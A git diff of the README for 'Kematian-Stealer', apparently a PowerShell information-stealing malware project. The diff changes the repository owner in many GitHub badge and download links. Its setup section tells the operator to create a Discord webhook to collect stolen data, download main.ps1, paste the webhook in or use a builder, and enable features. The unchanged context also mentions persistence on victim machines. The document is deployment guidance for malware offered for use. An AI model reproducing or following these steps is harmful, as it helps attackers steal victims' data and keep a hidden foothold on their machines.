@@ -3,35 +3,35 @@
 </p>
 
 <div align="center">
-  <a href="https://github.com/ChildrenOfYahweh/Kematian-Stealer/actions/workflows/build_builder.yml">
-  <img src="https://img.shields.io/github/actions/workflow/status/ChildrenOfYahweh/Kematian-Stealer/build_builder.yml?style=flat&label=builder-src&color=fa7202" alt="Builder Src"></a>
-  <a href="https://github.com/ChildrenOfYahweh/Kematian-Stealer/actions/workflows/build_backend.yml">
-    <img src="https://img.shields.io/github/actions/workflow/status/ChildrenOfYahweh/Kematian-Stealer/build_backend.yml?style=flat&label=kematian-src&color=fa7202" alt="Kematian Src">
+  <a href="https://github.com/Somali-Devs/Kematian-Stealer/actions/workflows/build_builder.yml">
+  <img src="https://img.shields.io/github/actions/workflow/status/Somali-Devs/Kematian-Stealer/build_builder.yml?style=flat&label=builder-src&color=fa7202" alt="Builder Src"></a>
+  <a href="https://github.com/Somali-Devs/Kematian-Stealer/actions/workflows/build_backend.yml">
+    <img src="https://img.shields.io/github/actions/workflow/status/Somali-Devs/Kematian-Stealer/build_backend.yml?style=flat&label=kematian-src&color=fa7202" alt="Kematian Src">
   </a>
   <br>
-  <a href="https://github.com/ChildrenOfYahweh/Kematian-Stealer">
-    <img src="https://img.shields.io/github/languages/top/ChildrenOfYahweh/Kematian-Stealer?color=fa7202" alt="Top Language"></a>
-  <a href="https://github.com/ChildrenOfYahweh/Kematian-Stealer/stargazers">
-    <img src="https://img.shields.io/github/stars/ChildrenOfYahweh/Kematian-Stealer?style=flat&color=fa7202" alt="Stars"></a>
-  <a href="https://github.com/ChildrenOfYahweh/Kematian-Stealer/forks">
-    <img src="https://img.shields.io/github/forks/ChildrenOfYahweh/Kematian-Stealer?style=flat&color=fa7202" alt="Forks"></a>
-  <a href="https://github.com/ChildrenOfYahweh/Kematian-Stealer/issues">
-    <img src="https://img.shields.io/github/issues/ChildrenOfYahweh/Kematian-Stealer?style=flat&color=fa7202" alt="Issues"></a>
-  <a href="https://github.com/ChildrenOfYahweh/Kematian-Stealer/commits">
-    <img src="https://img.shields.io/github/commit-activity/m/ChildrenOfYahweh/Kematian-Stealer?color=fa7202" alt="Commit Activity"></a>
-  <a href="https://github.com/ChildrenOfYahweh/Kematian-Stealer/tree/main/frontend-src">
+  <a href="https://github.com/Somali-Devs/Kematian-Stealer">
+    <img src="https://img.shields.io/github/languages/top/Somali-Devs/Kematian-Stealer?color=fa7202" alt="Top Language"></a>
+  <a href="https://github.com/Somali-Devs/Kematian-Stealer/stargazers">
+    <img src="https://img.shields.io/github/stars/Somali-Devs/Kematian-Stealer?style=flat&color=fa7202" alt="Stars"></a>
+  <a href="https://github.com/Somali-Devs/Kematian-Stealer/forks">
+    <img src="https://img.shields.io/github/forks/Somali-Devs/Kematian-Stealer?style=flat&color=fa7202" alt="Forks"></a>
+  <a href="https://github.com/Somali-Devs/Kematian-Stealer/issues">
+    <img src="https://img.shields.io/github/issues/Somali-Devs/Kematian-Stealer?style=flat&color=fa7202" alt="Issues"></a>
+  <a href="https://github.com/Somali-Devs/Kematian-Stealer/commits">
+    <img src="https://img.shields.io/github/commit-activity/m/Somali-Devs/Kematian-Stealer?color=fa7202" alt="Commit Activity"></a>
+  <a href="https://github.com/Somali-Devs/Kematian-Stealer/tree/main/frontend-src">
     <img src="https://img.shields.io/badge/Powershell-v3.0-fa7202" alt="Powershell v3.0"></a>
   <br>
-  <a href="https://github.com/ChildrenOfYahweh/Kematian-Stealer?tab=MIT-1-ov-file">
-    <img src="https://img.shields.io/github/license/ChildrenOfYahweh/Kematian-Stealer?color=fa7202" alt="License"></a>
-  <a href="https://github.com/ChildrenOfYahweh/Kematian-Stealer/graphs/contributors">
-    <img src="https://img.shields.io/github/contributors/ChildrenOfYahweh/Kematian-Stealer?color=fa7202" alt="Contributors"></a>
-  <a href="https://github.com/ChildrenOfYahweh/Kematian-Stealer">
-    <img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FChildrenOfYahweh%2FKematian-Stealer&count_bg=%23FA7202&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=views&edge_flat=false" alt="Views"></a>
-  <a href="https://github.com/ChildrenOfYahweh/Kematian-Stealer">
-    <img src="https://img.shields.io/github/repo-size/ChildrenOfYahweh/Kematian-Stealer?color=fa7202" alt="Repo Size"></a>
-  <a href="https://github.com/ChildrenOfYahweh/Kematian-Stealer">
-    <img src="https://img.shields.io/github/downloads/ChildrenOfYahweh/Kematian-Stealer/total?color=fa7202" alt="Total Downloads"></a>
+  <a href="https://github.com/Somali-Devs/Kematian-Stealer?tab=MIT-1-ov-file">
+    <img src="https://img.shields.io/github/license/Somali-Devs/Kematian-Stealer?color=fa7202" alt="License"></a>
+  <a href="https://github.com/Somali-Devs/Kematian-Stealer/graphs/contributors">
+    <img src="https://img.shields.io/github/contributors/Somali-Devs/Kematian-Stealer?color=fa7202" alt="Contributors"></a>
+  <a href="https://github.com/Somali-Devs/Kematian-Stealer">
+    <img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FSomali-Devs%2FKematian-Stealer&count_bg=%23FA7202&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=views&edge_flat=false" alt="Views"></a>
+  <a href="https://github.com/Somali-Devs/Kematian-Stealer">
+    <img src="https://img.shields.io/github/repo-size/Somali-Devs/Kematian-Stealer?color=fa7202" alt="Repo Size"></a>
+  <a href="https://github.com/Somali-Devs/Kematian-Stealer">
+    <img src="https://img.shields.io/github/downloads/Somali-Devs/Kematian-Stealer/total?color=fa7202" alt="Total Downloads"></a>
 </div>
 
 
@@ -49,8 +49,8 @@ Moreover, the tool has robust `persistence mechanisms` to remain active on the m
 - Create a Webhook on your [Discord Server](https://discord.com), it's advisable to create a new server for this purpose.
 - After creating a server go to `Edit channel` > `Integrations` > `Webhooks` > `Create Webhook`
 - Copy the `Webhook URL`
-- Download [main.ps1](https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/main.ps1) 
-- Open `main.ps1` and replace `YOUR_WEBHOOK_HERE` in line `1` with your webhook or use the [builder](https://github.com/ChildrenOfYahweh/Kematian-Stealer/releases/tag/Builder).
+- Download [main.ps1](https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/main.ps1) 
+- Open `main.ps1` and replace `YOUR_WEBHOOK_HERE` in line `1` with your webhook or use the [builder](https://github.com/Somali-Devs/Kematian-Stealer/releases/tag/Builder).
 - Additionally, set `$true` for the variables you wish to activate. Conversely, utilize `$false` to deactivate them, as shown in `configurations` below.
  
  > [!NOTE]   
